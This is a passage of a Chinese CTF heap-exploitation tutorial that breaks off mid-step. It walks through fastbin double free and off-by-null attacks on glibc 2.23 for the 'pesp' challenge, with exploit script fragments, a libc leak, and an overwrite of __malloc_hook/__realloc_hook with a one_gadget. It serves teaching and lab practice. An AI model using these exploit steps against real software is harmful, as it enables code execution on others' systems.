0x11de880:      0x3535353535353535      0x3535353535353535
0x11de890:      0x3535353535353535      0x3535353535353535
0x11de8a0:      0x3535353535353535      0x0035353535353535
0x11de8b0:      0x0000000000000090      0x0000000000000021
0x11de8c0:      0x3131313131313131      0x0031313131313131
0x11de8d0:      0x0000000000000000      0x0000000000000091
0x11de8e0:      0x00007fe8f1108b78      0x00007fe8f1108b78
0x11de8f0:      0x3434343434343434      0x3434343434343434
0x11de900:      0x3434343434343434      0x3434343434343434
0x11de910:      0x3434343434343434      0x3434343434343434
0x11de920:      0x3434343434343434      0x3434343434343434
0x11de930:      0x3434343434343434      0x3434343434343434
0x11de940:      0x3434343434343434      0x3434343434343434
0x11de950:      0x3434343434343434      0x0034343434343434
0x11de960:      0x0000000000000090      0x0000000000000070
0x11de970:      0x6161616161616161      0x6161616161616161
```

**STEP4** 接下来就是fastbin double free了。

```
add(0x68, 'a' * 0x68)    # 3
add(0x68, 'b' * 0x68)    # 4
...
delete(3)
delete(4)
add(0x68, 'c' * 0x68)    # 3=chunk4
delete(4)
```

内存布局如下：

```
pwndbg> x/gx 0x6020a0
0x6020a0 <list>:        0x00000000011dd010
pwndbg> x/20gx 0x11dd010
0x11dd010:      0x0000000000000100      0x0000000000000002
0x11dd020:      0x0000000000000001      0x0000000000000080
0x11dd030:      0x00000000011de8e0      0x0000000000000001
0x11dd040:      0x0000000000000010      0x00000000011de8c0
0x11dd050:      0x0000000000000001      0x0000000000000080
0x11dd060:      0x00000000011de830      0x0000000000000001
0x11dd070:      0x0000000000000068      0x00000000011de9e0
0x11dd080:      0x0000000000000000      0x0000000000000000
0x11dd090:      0x00000000011de9e0      0x0000000000000000
0x11dd0a0:      0x0000000000000000      0x0000000000000000
pwndbg> x/32gx 0x11de970-0x10
0x11de960:      0x0000000000000090      0x0000000000000070
0x11de970:      0x0000000000000000      0x6161616161616161
0x11de980:      0x6161616161616161      0x6161616161616161
0x11de990:      0x6161616161616161      0x6161616161616161
0x11de9a0:      0x6161616161616161      0x6161616161616161
0x11de9b0:      0x6161616161616161      0x6161616161616161
0x11de9c0:      0x6161616161616161      0x6161616161616161
0x11de9d0:      0x0061616161616161      0x0000000000000071
0x11de9e0:      0x00000000011de960      0x6363636363636363
0x11de9f0:      0x6363636363636363      0x6363636363636363
0x11dea00:      0x6363636363636363      0x6363636363636363
0x11dea10:      0x6363636363636363      0x6363636363636363
0x11dea20:      0x6363636363636363      0x6363636363636363
0x11dea30:      0x6363636363636363      0x6363636363636363
0x11dea40:      0x0063636363636363      0x00000000000205c1
0x11dea50:      0x0000000000000000      0x0000000000000000
```

**STEP5** 通过fastbin double将fastbin构造在了`__realloc_hook`，最后触发realloc调用完成利用。

```
pwndbg> x/gx 0x6020a0
0x6020a0 <list>:        0x0000000001610010
pwndbg> x/20gx 0x0000000001610010
0x1610010:      0x0000000000000100      0x0000000000000004
0x1610020:      0x0000000000000001      0x0000000000000080
0x1610030:      0x00000000016118e0      0x0000000000000001
0x1610040:      0x0000000000000010      0x00000000016118c0
0x1610050:      0x0000000000000001      0x0000000000000080
0x1610060:      0x0000000001611830      0x0000000000000001
0x1610070:      0x0000000000000068      0x00000000016119e0
0x1610080:      0x0000000000000001      0x0000000000000068
0x1610090:      0x00000000016119e0      0x0000000000000001
0x16100a0:      0x0000000000000068      [0x007f94bf23cafd]               # 被分配在了realloc_hook附近
pwndbg> x/20gx 0x00007f94bf23cafd-0x5
0x7f94bf23caf8: 0x0000000000000000      0x0000000000000000
0x7f94bf23cb08 <__realloc_hook>:        [0x007f94bef69147]      0x0000000000000000   # 已被改为onegadget
0x7f94bf23cb18: 0x0000000000000000      0x0000000000000000
0x7f94bf23cb28 <main_arena+8>:  0x0000000000000000      0x0000000000000000
0x7f94bf23cb38 <main_arena+24>: 0x0000000000000000      0x0000000000000000
```

## tcache简介

- tcache出现在glibc2.26(Ubuntu17.10)之后
- 第一次malloc时，会先malloc一块内存放在堆头，存在tcache的一些结构体
- small bin范围大小内的chunk都会使用tcache，行为几乎和fastbin类似，但每个tcache链上最多只能有7个bin
- 2.29之前的tcache在malloc时没有任何检查，free时没有double free检查
- malloc时没有检测，不需要伪造size，从fastbin attack的write-anything-somewhere升级为write-anything-anywhere 
  (大小和smallbin一样，相当于没有任何检查的fastbin，连续free没有检查，malloc也没有size检查)

![](images/堆漏洞利用/tcache.png)



## off-by-null

### 实战案例 - 网鼎杯2018 pesp

题目地址：http://github.com/bash-c/public_class_examples

> 即前面的堆溢出的案例，细节不再赘述，前面提到add_item()函数中有个off by null，末尾0字节溢出漏洞。
>
> 该题目可以提高一下难度，假设程序开启PIE，并且没有堆溢出，只利用其中的off-by-null漏洞也可以解决

**解决思路 - off-by-null**

  - 假设没有arbitrary heap overflow，并且程序开启了PIE，只利用off-by-null完成利用
  - off-by-null的利用可以参考 http://devel0pment.de/?p=688

**详细调试实战**

> 调试环境： Ubuntu 16.04 x64 (libc-2.23)

基本的EXP框架和交互函数封装和前面相同，这里不再赘述，直接进入主要构造利用部分。

**STEP1**  先通过添加4个节点申请4个chunk，其中chunk1用于触发off by null并更新chunk2的prev_size，chunk3用于防止bin和top_chunk合并：

```
add(0xf8, '0' * 0xf8)
add(0x68, '1' * 0x68) # trigger off-by-null
add(0xf8, '2' * 0xf8)
add(0x18, '3' * 0x10)
pause()
edit(1, 0x68, flat('1' * 0x68)) # 0x68可写到下一个chunk的prev_size(写到prev_size属堆正常机制，不算溢出)
```

> 待解决疑问: 实测时节点3写入长度为0x10而不能为0x18，不然后面delete(2)会报corrupted size vs. prev_size错误，为什么?

运行脚本并gdb附加调试，执行到pause时，先看下节点的堆内存布局

```
gdb -q -p `pidof pwn` -ex "*0x40BC05" -ex "c"
pwndbg> heapbase               # 查看heapbase地址
heapbase:  0xbec000
pwndbg> x/90gx 0xbec000        # 查看堆分配情况
0xbec000:      0x0000000000000000      0x0000000000000021
0xbec010:      0x0000000000400896      0x00000000004008b1
0xbec020:      0x0000000000000000      0x0000000000000101 \
0xbec030:      0x3030303030303030      0x3030303030303030 |
0xbec040:      0x3030303030303030      0x3030303030303030 |
0xbec050:      0x3030303030303030      0x3030303030303030 |
0xbec060:      0x3030303030303030      0x3030303030303030 |
0xbec070:      0x3030303030303030      0x3030303030303030 |
0xbec080:      0x3030303030303030      0x3030303030303030 |
0xbec090:      0x3030303030303030      0x3030303030303030 | chunkA
0xbec0a0:      0x3030303030303030      0x3030303030303030 |
0xbec0b0:      0x3030303030303030      0x3030303030303030 |
0xbec0c0:      0x3030303030303030      0x3030303030303030 |
0xbec0d0:      0x3030303030303030      0x3030303030303030 |
0xbec0e0:      0x3030303030303030      0x3030303030303030 |
0xbec0f0:      0x3030303030303030      0x3030303030303030 |
0xbec100:      0x3030303030303030      0x3030303030303030 |
0xbec110:      0x3030303030303030      0x3030303030303030 /
0xbec120:      0x3030303030303030      0x0000000000000071 \
0xbec130:      0x3131313131313131      0x3131313131313131 |
0xbec140:      0x3131313131313131      0x3131313131313131 |
0xbec150:      0x3131313131313131      0x3131313131313131 | chunkB
0xbec160:      0x3131313131313131      0x3131313131313131 |
0xbec170:      0x3131313131313131      0x3131313131313131 |
0xbec180:      0x3131313131313131      0x3131313131313131 /
0xbec190:      0x3131313131313131      0x0000000000000101 \
0xbec1a0:      0x3232323232323232      0x3232323232323232 |
0xbec1b0:      0x3232323232323232      0x3232323232323232 |
0xbec1c0:      0x3232323232323232      0x3232323232323232 |
0xbec1d0:      0x3232323232323232      0x3232323232323232 |
0xbec1e0:      0x3232323232323232      0x3232323232323232 |
0xbec1f0:      0x3232323232323232      0x3232323232323232 |
0xbec200:      0x3232323232323232      0x3232323232323232 | chunkC
0xbec210:      0x3232323232323232      0x3232323232323232 |
0xbec220:      0x3232323232323232      0x3232323232323232 |
0xbec230:      0x3232323232323232      0x3232323232323232 |
0xbec240:      0x3232323232323232      0x3232323232323232 |
0xbec250:      0x3232323232323232      0x3232323232323232 |
0xbec260:      0x3232323232323232      0x3232323232323232 |
0xbec270:      0x3232323232323232      0x3232323232323232 |
0xbec280:      0x3232323232323232      0x3232323232323232 /
0xbec290:      0x3232323232323232      0x0000000000000021 \ chunkD
0xbec2a0:      0x3333333333333333      0x3333333333333333 /
0xbec2b0:      0x0000000000000000      0x0000000000020be1
0xbec2c0:      0x0000000000000000      0x0000000000000000   
```

**STEP2**  编辑脚本，先free chunk0，再通过chunk1触发off-by-null漏洞覆盖chunk2的P位(previous in use)，同时把chunk2的prev_size改为sizeof(chunk0) + sizeof(chunk1)。这样可以保证free触发unlink的合并，再free chunk2。

> 这一过程细节可以网上查free过程资料，或带源码调试

```
add(0xf8, '0' * 0xf8)
add(0x68, '1' * 0x68) # trigger off-by-null
add(0xf8, '2' * 0xf8)
add(0x18, '3' * 0x10)
delete(0)
edit(1, 0x68, flat('1' * 0x60, 0x170))
pause()
delete(2)
```

off-by-null发生时，chunk2的P位清零，通过free chunk2触发chunk0和chunk2合并为一个大的bin，此时chunk1被overlap (即chunk1实际上没有被free，但处于先前有chunk0和chunk2合并的free chunk当中)。

> 之所以需要先free chunk0，是因为要触发unlink，先free chunk0是为了构造unlink的条件，具体参考unlink资料。chunk0 free后，这两个chunk合并可以通过unlink检查。

off-by-null并改写prev_size后:

```
pwndbg> x/86gx 0x1620020
0x1620020:      0x0000000000000000      [0x00000000000101] \
0x1620030: fd-> [0x007f4515a8fb78] bk-> [0x007f4515a8fb78] |
0x1620040:      0x3030303030303030      0x3030303030303030 |
0x1620050:      0x3030303030303030      0x3030303030303030 |
0x1620060:      0x3030303030303030      0x3030303030303030 |
0x1620070:      0x3030303030303030      0x3030303030303030 |
0x1620080:      0x3030303030303030      0x3030303030303030 |
0x1620090:      0x3030303030303030      0x3030303030303030 | free chunk
0x16200a0:      0x3030303030303030      0x3030303030303030 |
0x16200b0:      0x3030303030303030      0x3030303030303030 |
0x16200c0:      0x3030303030303030      0x3030303030303030 |
0x16200d0:      0x3030303030303030      0x3030303030303030 |
0x16200e0:      0x3030303030303030      0x3030303030303030 |
0x16200f0:      0x3030303030303030      0x3030303030303030 |
0x1620100:      0x3030303030303030      0x3030303030303030 |
0x1620110:      0x3030303030303030      0x3030303030303030 /
0x1620120:      [0x00000000000100]      [0x00000000000070] \                # 0x100: prev_size (set by free)
0x1620130:      0x3131313131313131      0x3131313131313131 |
0x1620140:      0x3131313131313131      0x3131313131313131 |
0x1620150:      0x3131313131313131      0x3131313131313131 | chunk1
0x1620160:      0x3131313131313131      0x3131313131313131 |
0x1620170:      0x3131313131313131      0x3131313131313131 |
0x1620180:      0x3131313131313131      0x3131313131313131 /
0x1620190:      [0x00000000000170]      [0x00000000000100] \               # 0x170: fake prev_size
0x16201a0:      0x3232323232323232      0x3232323232323232 |               # 0x100: clear prev_inuse flag
0x16201b0:      0x3232323232323232      0x3232323232323232 |
0x16201c0:      0x3232323232323232      0x3232323232323232 |
0x16201d0:      0x3232323232323232      0x3232323232323232 |
0x16201e0:      0x3232323232323232      0x3232323232323232 |
0x16201f0:      0x3232323232323232      0x3232323232323232 |
0x1620200:      0x3232323232323232      0x3232323232323232 | chunk2
0x1620210:      0x3232323232323232      0x3232323232323232 |
0x1620220:      0x3232323232323232      0x3232323232323232 |
0x1620230:      0x3232323232323232      0x3232323232323232 |
0x1620240:      0x3232323232323232      0x3232323232323232 |
0x1620250:      0x3232323232323232      0x3232323232323232 |
0x1620260:      0x3232323232323232      0x3232323232323232 |
0x1620270:      0x3232323232323232      0x3232323232323232 |
0x1620280:      0x3232323232323232      0x3232323232323232 /
0x1620290:      0x3232323232323232      [0x00000000000021] \chunk2
0x16202a0:      0x3333333333333333      0x3333333333333333 /
0x16202b0:      0x0000000000000000      0x0000000000020be1
0x16202c0:      0x0000000000000000      0x0000000000000000
```

free chunk2后，chunk1被overlap:

```
pwndbg> x/86gx 0x1620020
0x1620020:      0x0000000000000000      [0x00000000000271]         \
0x1620030: fd-> [0x007f4515a8fb78] bk-> [0x007f4515a8fb78]         |
0x1620040:      0x3030303030303030      0x3030303030303030         |
0x1620050:      0x3030303030303030      0x3030303030303030         |
0x1620060:      0x3030303030303030      0x3030303030303030         |
0x1620070:      0x3030303030303030      0x3030303030303030         |
0x1620080:      0x3030303030303030      0x3030303030303030         |
0x1620090:      0x3030303030303030      0x3030303030303030         |
0x16200a0:      0x3030303030303030      0x3030303030303030         |
0x16200b0:      0x3030303030303030      0x3030303030303030         |
0x16200c0:      0x3030303030303030      0x3030303030303030         |
0x16200d0:      0x3030303030303030      0x3030303030303030         |
0x16200e0:      0x3030303030303030      0x3030303030303030         |
0x16200f0:      0x3030303030303030      0x3030303030303030         |
0x1620100:      0x3030303030303030      0x3030303030303030         |
0x1620110:      0x3030303030303030      0x3030303030303030         |
0x1620120:      0x0000000000000100      [0x00000000000070] \       | free chunk
0x1620130:      0x3131313131313131      0x3131313131313131 |       | (size 0x270)
0x1620140:      0x3131313131313131      0x3131313131313131 |       |
0x1620150:      0x3131313131313131      0x3131313131313131 |chunk1 |
0x1620160:      0x3131313131313131      0x3131313131313131 |       |
0x1620170:      0x3131313131313131      0x3131313131313131 |       |
0x1620180:      0x3131313131313131      0x3131313131313131 /       |
0x1620190:      0x0000000000000170      0x0000000000000100         |
0x16201a0:      0x3232323232323232      0x3232323232323232         |
0x16201b0:      0x3232323232323232      0x3232323232323232         |
0x16201c0:      0x3232323232323232      0x3232323232323232         |
0x16201d0:      0x3232323232323232      0x3232323232323232         |
0x16201e0:      0x3232323232323232      0x3232323232323232         |
0x16201f0:      0x3232323232323232      0x3232323232323232         |
0x1620200:      0x3232323232323232      0x3232323232323232         |
0x1620210:      0x3232323232323232      0x3232323232323232         |
0x1620220:      0x3232323232323232      0x3232323232323232         |
0x1620230:      0x3232323232323232      0x3232323232323232         |
0x1620240:      0x3232323232323232      0x3232323232323232         |
0x1620250:      0x3232323232323232      0x3232323232323232         |
0x1620260:      0x3232323232323232      0x3232323232323232         |
0x1620270:      0x3232323232323232      0x3232323232323232         |
0x1620280:      0x3232323232323232      0x3232323232323232         /
0x1620290:      [0x00000000000270]      [0x00000000000020] \chunk2         # 0x270: prev_size (set by free)
0x16202a0:      0x3333333333333333      0x3333333333333333 /
0x16202b0:      0x0000000000000000      0x0000000000020be1
0x16202c0:      0x0000000000000000      0x0000000000000000
```

**STEP3**  然后申请一个合适大小的chunk4，chunk4会从上一步的free chunk中分割出来，使得分割后对应的fd、bk刚好落入到被overlap的chunk1里，这样就可以将它们的值打印出来，从而实现leak libc

> 前面提到过，这里的chunk1实际上没有被free，可以打印其中的fd，也就能leak libc

```
add(0xf8, '0' * 0xf8)
add(0x68, '1' * 0x68)
add(0xf8, '2' * 0xf8)
add(0x18, '3' * 0x10)
delete(0)
edit(1, 0x68, flat('1' * 0x60, 0x170))
delete(2)
pause()
add(0xf0, 'x' * 0x10)
```

分配chunk4后，堆内存如下，并且fd、bk落在chunk1里，通过读取chunk1就可以leak出来

```
pwndbg> x/86gx 0x1620020
0x1620020:      0x0000000000000000      0x0000000000000101 \
0x1620030:      0x7878787878787878      0x7878787878787878 |
0x1620040:      0x3030303030303000      0x3030303030303030 |
0x1620050:      0x3030303030303030      0x3030303030303030 |
0x1620060:      0x3030303030303030      0x3030303030303030 |
0x1620070:      0x3030303030303030      0x3030303030303030 |
0x1620080:      0x3030303030303030      0x3030303030303030 |
0x1620090:      0x3030303030303030      0x3030303030303030 | chunk4
0x16200a0:      0x3030303030303030      0x3030303030303030 |
0x16200b0:      0x3030303030303030      0x3030303030303030 |
0x16200c0:      0x3030303030303030      0x3030303030303030 |
0x16200d0:      0x3030303030303030      0x3030303030303030 |
0x16200e0:      0x3030303030303030      0x3030303030303030 |
0x16200f0:      0x3030303030303030      0x3030303030303030 |
0x1620100:      0x3030303030303030      0x3030303030303030 |
0x1620110:      0x3030303030303030      0x3030303030303030 /
0x1620120:      0x0000000000000100      0x0000000000000171 \         \
0x1620130: fd-> [0x007f95b314fb78] bk-> [0x007f95b314fb78] |         |         # leak libc
0x1620140:      0x3131313131313131      0x3131313131313131 |         |
0x1620150:      0x3131313131313131      0x3131313131313131 | chunk1  |
0x1620160:      0x3131313131313131      0x3131313131313131 |         |
0x1620170:      0x3131313131313131      0x3131313131313131 |         |
0x1620180:      0x3131313131313131      0x3131313131313131 /         |
0x1620190:      0x0000000000000170      0x0000000000000100           |
0x16201a0:      0x3232323232323232      0x3232323232323232           |
0x16201b0:      0x3232323232323232      0x3232323232323232           |
0x16201c0:      0x3232323232323232      0x3232323232323232           |  free chunk
0x16201d0:      0x3232323232323232      0x3232323232323232           | (size 0x170)
0x16201e0:      0x3232323232323232      0x3232323232323232           |
0x16201f0:      0x3232323232323232      0x3232323232323232           |
0x1620200:      0x3232323232323232      0x3232323232323232           |
0x1620210:      0x3232323232323232      0x3232323232323232           |
0x1620220:      0x3232323232323232      0x3232323232323232           |
0x1620230:      0x3232323232323232      0x3232323232323232           |
0x1620240:      0x3232323232323232      0x3232323232323232           |
0x1620250:      0x3232323232323232      0x3232323232323232           |
0x1620260:      0x3232323232323232      0x3232323232323232           |
0x1620270:      0x3232323232323232      0x3232323232323232           |
0x1620280:      0x3232323232323232      0x3232323232323232           /
0x1620290:      0x0000000000000170      0x0000000000000020 \ chunk3
0x16202a0:      0x3333333333333333      0x3333333333333333 /
0x16202b0:      0x0000000000000000      0x0000000000020be1
0x16202c0:      0x0000000000000000      0x0000000000000000
```

**STEP4**  打印fd指针leak libc

已经能够获得到fd的值，是指向libc的main_arena区域的，确定一下其偏移：

```
pwndbg> unsortedbin
unsortedbin
all: 0x1e75120 —▸ 0x7f95b314fb78 (main_arena+88) ◂— 0x1e75120
pwndbg> xinfo 0x00007f95b314fb78
Extended information for virtual address 0x7f95b314fb78:
  Containing mapping:
    0x7f95b314f000     0x7f95b3151000 rw-p     2000 1c4000 /lib/x86_64-linux-gnu/libc-2.23.so
  Offset information:
         Mapped Area 0x7f95b314fb78 = 0x7f95b314f000 + 0xb78
         File (Base) 0x7f95b314fb78 = 0x7f95b2d8b000 + 0x3c4b78                   # 确定偏移为0x3c4b78
      File (Segment) 0x7f95b314fb78 = 0x7f95b314b7c0 + 0x43b8
         File (Disk) 0x7f95b314fb78 = /lib/x86_64-linux-gnu/libc-2.23.so + 0x1c4b78
 Containing ELF sections:
               .data 0x7f95b314fb78 = 0x7f95b314f080 + 0xaf8
```

改下脚本读取leak地址并确定libc基址：

```
add(0xf8, '0' * 0xf8)
add(0x68, '1' * 0x68)
add(0xf8, '2' * 0xf8)
add(0x18, '3' * 0x10)
delete(0)
edit(1, 0x68, flat('1' * 0x60, 0x170))
delete(2)
pause()
add(0xf0, 'x' * 0x10)
show()
libc.address = u64(p.recvuntil('\x7f')[-6:]+'\0\0') - 0x3c4b78
print('libc @ {:#x}'.format(libc.address))
assert libc.address & 0xfff == 0
add(0x160, '4' * 0x160)
```

> 上面脚本最后还新增加了一个节点，因为前面新增节点后，剩余的还有0x171大小的chunk，这时是在unsorted bin中，我们把他申请回来，大小为0x160，以免影响后续的分配操作

**STEP5** 接下来需要再通过一次overlap chunk更改free'd chunk的fd

基本上就是将前面的代码拷贝修改一下：

```
...
add(0xf8, 'a' * 0xf8)
add(0x68, 'b' * 0x68) # trigger off-by-null
add(0xf8, 'c' * 0xf8)
add(0x18, 'd' * 0x10)
pause()
delete(0)
edit(1, 0x68, flat('1' * 0x60, 0x170))
delete(2)
```

不过这里释放和修改的节点编号需要调整一下，可以使用telescope看下全局变量中的节点排布来确定：

```
pwndbg> telescope 0x6820C0 20
00:0000│   0x6020c0 (itemlist) ◂— 0xf0
01:0008│   0x6020c8 (itemlist+8) —▸ 0xbc3030 ◂— 'xxxxxxxxxxxxxxxx'
02:0010│   0x6020d0 (itemlist+16) ◂— 0x68 /* 'h' */
03:0018│   0x6020d8 (itemlist+24) —▸ 0xbc3130 ◂— 0x3434343434343434 ('44444444')
04:0020│   0x6020e0 (itemlist+32) ◂— 0x160
05:0028│   0x6020e8 (itemlist+40) —▸ 0xbc3130 ◂— 0x3434343434343434 ('44444444')
06:0030│   0x6020f0 (itemlist+48) ◂— 0x18
07:0038│   0x6020f8 (itemlist+56) —▸ 0xbc32a0 ◂— '3333333333333333'
08:0040│   0x602100 (itemlist+64) ◂— 0xf8
09:0048│   0x602108 (itemlist+72) —▸ 0xbc32c0 ◂— 0x6161616161616161 ('aaaaaaaa')
0a:0050│   0x602110 (itemlist+80) ◂— 0x68 /* 'h' */
0b:0058│   0x602118 (itemlist+88) —▸ 0xbc33c0 ◂— 0x6262626262626262 ('bbbbbbbb')
0c:0060│   0x602120 (itemlist+96) ◂— 0xf8
0d:0068│   0x602128 (itemlist+104) —▸ 0xbc3430 ◂— 0x6363636363636363 ('cccccccc')
0e:0070│   0x602130 (itemlist+112) ◂— 0x18
0f:0078│   0x602138 (itemlist+120) —▸ 0xbc3530 ◂— 'dddddddddddddddd'
10:0080│   0x602140 (itemlist+128) ◂— 0x0
...
```

所以根据节点排布重新调整节点操作如下：

```
delete(4)
edit(5, 0x68, flat('1' * 0x60, 0x170))
delete(6)
```

**STEP6** 继续编写脚本， 这次把overlap掉的chunk也要free掉，这样其中的fd、bk才有意义，才能起作用

```
...
add(0xf8, 'a' * 0xf8)
add(0x68, 'b' * 0x68)
add(0xf8, 'c' * 0xf8)
add(0x18, 'd' * 0x10)
pause()
delete(4)
edit(5, 0x68, flat('b' * 0x60, 0x170))
delete(6)
delete(5)                       # 把overlap掉的chunk也free掉
```

edit修改节点之后，触发off-by-one和prev_size覆写，此时堆布局如下：

```
pwndbg> x/90gx 0x21812b0        # 查看堆布局
0x21812b0:      0x0000000000000000      0x0000000000000101
0x21812c0:      0x00007fd02a838b78      0x00007fd02a838b78
0x21812d0:      0x6161616161616161      0x6161616161616161
0x21812e0:      0x6161616161616161      0x6161616161616161
0x21812f0:      0x6161616161616161      0x6161616161616161
0x2181300:      0x6161616161616161      0x6161616161616161
0x2181310:      0x6161616161616161      0x6161616161616161
0x2181320:      0x6161616161616161      0x6161616161616161
0x2181330:      0x6161616161616161      0x6161616161616161
0x2181340:      0x6161616161616161      0x6161616161616161
0x2181350:      0x6161616161616161      0x6161616161616161
0x2181360:      0x6161616161616161      0x6161616161616161
0x2181370:      0x6161616161616161      0x6161616161616161
0x2181380:      0x6161616161616161      0x6161616161616161
0x2181390:      0x6161616161616161      0x6161616161616161
0x21813a0:      0x6161616161616161      0x6161616161616161
0x21813b0:      0x0000000000000100      0x0000000000000070
0x21813c0:      0x3131313131313131      0x3131313131313131
0x21813d0:      0x3131313131313131      0x3131313131313131
0x21813e0:      0x3131313131313131      0x3131313131313131
0x21813f0:      0x3131313131313131      0x3131313131313131
0x2181400:      0x3131313131313131      0x3131313131313131
0x2181410:      0x3131313131313131      0x3131313131313131
0x2181420:      0x0000000000000170      0x0000000000000100
0x2181430:      0x6363636363636363      0x6363636363636363
0x2181440:      0x6363636363636363      0x6363636363636363
0x2181450:      0x6363636363636363      0x6363636363636363
0x2181460:      0x6363636363636363      0x6363636363636363
0x2181470:      0x6363636363636363      0x6363636363636363
0x2181480:      0x6363636363636363      0x6363636363636363
0x2181490:      0x6363636363636363      0x6363636363636363
0x21814a0:      0x6363636363636363      0x6363636363636363
0x21814b0:      0x6363636363636363      0x6363636363636363
0x21814c0:      0x6363636363636363      0x6363636363636363
0x21814d0:      0x6363636363636363      0x6363636363636363
0x21814e0:      0x6363636363636363      0x6363636363636363
0x21814f0:      0x6363636363636363      0x6363636363636363
0x2181500:      0x6363636363636363      0x6363636363636363
0x2181510:      0x6363636363636363      0x6363636363636363
0x2181520:      0x6363636363636363      0x0000000000000021
0x2181530:      0x6464646464646464      0x6464646464646464
0x2181540:      0x0000000000000000      0x00000000000207e1
0x2181550:      0x0000000000000000      0x0000000000000000
```

delete(5)后，对应的fastbin chunk在0x21813b0上：

```
pwndbg> fastbins
fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x21813b0 ◂— 0x0
0x80: 0x0
pwndbg> bins 
fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x21813b0 ◂— 0x0
0x80: 0x0
unsortedbin
all: 0x21812b0 —▸ 0x7fb2c7c1ab78 (main_arena+88) ◂— 0x21812b0
smallbins
empty
largebins
empty
pwndbg> 

```

**STEP7** 查看此时内存布局如下，空闲的unsorted bin大小是0x270

```
pwndbg> x/86gx 0x21812b0
0x21812b0:      0x0000000000000000      0x0000000000000271
0x21812c0:      0x00007fd02a838b78      0x00007fd02a838b78
0x21812d0:      0x6161616161616161      0x6161616161616161
0x21812e0:      0x6161616161616161      0x6161616161616161
0x21812f0:      0x6161616161616161      0x6161616161616161
0x2181300:      0x6161616161616161      0x6161616161616161
0x2181310:      0x6161616161616161      0x6161616161616161
0x2181320:      0x6161616161616161      0x6161616161616161
0x2181330:      0x6161616161616161      0x6161616161616161
0x2181340:      0x6161616161616161      0x6161616161616161
0x2181350:      0x6161616161616161      0x6161616161616161
0x2181360:      0x6161616161616161      0x6161616161616161
0x2181370:      0x6161616161616161      0x6161616161616161
0x2181380:      0x6161616161616161      0x6161616161616161
0x2181390:      0x6161616161616161      0x6161616161616161
0x21813a0:      0x6161616161616161      0x6161616161616161
0x21813b0:      0x0000000000000100      0x0000000000000070
0x21813c0:      0x0000000000000000      0x3131313131313131
0x21813d0:      0x3131313131313131      0x3131313131313131
0x21813e0:      0x3131313131313131      0x3131313131313131
0x21813f0:      0x3131313131313131      0x3131313131313131
0x2181400:      0x3131313131313131      0x3131313131313131
0x2181410:      0x3131313131313131      0x3131313131313131
0x2181420:      0x0000000000000170      0x0000000000000100
0x2181430:      0x6363636363636363      0x6363636363636363
0x2181440:      0x6363636363636363      0x6363636363636363
0x2181450:      0x6363636363636363      0x6363636363636363
0x2181460:      0x6363636363636363      0x6363636363636363
0x2181470:      0x6363636363636363      0x6363636363636363
0x2181480:      0x6363636363636363      0x6363636363636363
0x2181490:      0x6363636363636363      0x6363636363636363
0x21814a0:      0x6363636363636363      0x6363636363636363
0x21814b0:      0x6363636363636363      0x6363636363636363
0x21814c0:      0x6363636363636363      0x6363636363636363
0x21814d0:      0x6363636363636363      0x6363636363636363
0x21814e0:      0x6363636363636363      0x6363636363636363
0x21814f0:      0x6363636363636363      0x6363636363636363
0x2181500:      0x6363636363636363      0x6363636363636363
0x2181510:      0x6363636363636363      0x6363636363636363
0x2181520:      0x0000000000000270      0x0000000000000020
0x2181530:      0x6464646464646464      0x6464646464646464
0x2181540:      0x0000000000000000      0x00000000000207e1
0x2181550:      0x0000000000000000      0x0000000000000000
```

从中分配0x120节点，使该unsorted bin分裂，并尝试覆写已经释放的chunk5的fd指针：

```
...
pause()
#add(0x120, flat(cyclic(n = 8, length = 0x120)))
add(0x120, flat('a' * 256, 0xdeadbeef))
```

对应的fastbin chunk链在0x19cd3b0上再连到0xdeadbeef上，经过两次malloc分配可以分配到指定地址

```
pwndbg> fastbins
fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x19cd3b0 ◂— 0xdeadbeef
0x80: 0x0
```

不过还需要进一步调整一下覆写内容和偏移，fd偏移为256，前面还要构造chunk size=0x71，所以偏移为248，更新如下：

```
add(0x120, flat('a' * 248, 0x71, 0xdeadeef)
```

**STEP8** 接下来确定堆内存分配的目标地址。没开pie的情况下可以改写GOT，现在假设开了pie，可以改`__malloc_hook`或`__realloc_hook`，因此选择写`libc.sym["__malloc_hook"] - 0x23`，相关细节如下：

```
pwndbg> magic # 查看一些常用的关键函数或变量地址，如__malloc_hook、__realloc_hook等
---------- function ----------
system: 0x45390
execve: 0xcc770
open: 0xf7030
read: 0xf7250
write: 0xf72b0
gets: 0x6ed80
setcontext+0x35:0x47b75
---------- variables ----------
__malloc_hook(0x3c4b10)                 : 0x0000000000000000
__free_hook(0x3c67a8)                   : 0x0000000000000000
__realloc_hook(0x3c4b08)                : 0x00007fcfb08c0a00
stdin(-0x7fcfb0238f50)                  : 0x00007fcfb0bff8e0
stdout(-0x7fcfb0238f60)                 : 0x00007fcfb0c00620
_IO_list_all(0x3c5520)                  : 0x00007fcfb0c00540
__after_morecore_hook(0x3c67a0)         : 0x0000000000000000
pwndbg> p &__malloc_hook                # 查看__malloc_hook地址
$1 = (void *(**)(size_t, const void *)) 0x7f09dd6a2b10 <__malloc_hook>
pwndbg> x/20gx 0x7f09dd6a2b10-0x23      # 查看__malloc_hook附近内存，寻找合适的伪造chunk的地方
0x7f09dd6a2aed <_IO_wide_data_0+301>:   0x09dd6a1260000000      0x000000000000007f
0x7f09dd6a2afd: 0x09dd363e20000000      0x09dd363a0000007f
0x7f09dd6a2b0d <__realloc_hook+5>:      0x000000000000007f      0x0000000000000000
0x7f09dd6a2b1d: 0x0000000000000000      0x0000000000000000
0x7f09dd6a2b2d <main_arena+13>: 0x0000000000000000      0x0000000000000000
0x7f09dd6a2b3d <main_arena+29>: 0x0000000000000000      0x0000000000000000
0x7f09dd6a2b4d <main_arena+45>: 0x0001df53b0000000      0x0000000000000000
0x7f09dd6a2b5d <main_arena+61>: 0x0000000000000000      0x0000000000000000
0x7f09dd6a2b6d <main_arena+77>: 0x0000000000000000      0x0001df5540000000
0x7f09dd6a2b7d <main_arena+93>: 0x0001df53e0000000      0x0001df53e0000000
pwndbg> x/4gx 0x7f09dd6a2b10-0x23       # 找到了合适的伪造地址
0x7f09dd6a2aed <_IO_wide_data_0+301>:   0x09dd6a1260000000      0x000000000000007f
0x7f09dd6a2afd: 0x09dd363e20000000      0x09dd363a0000007f
```

然后相应的更新脚本如下：

```
...
pause()
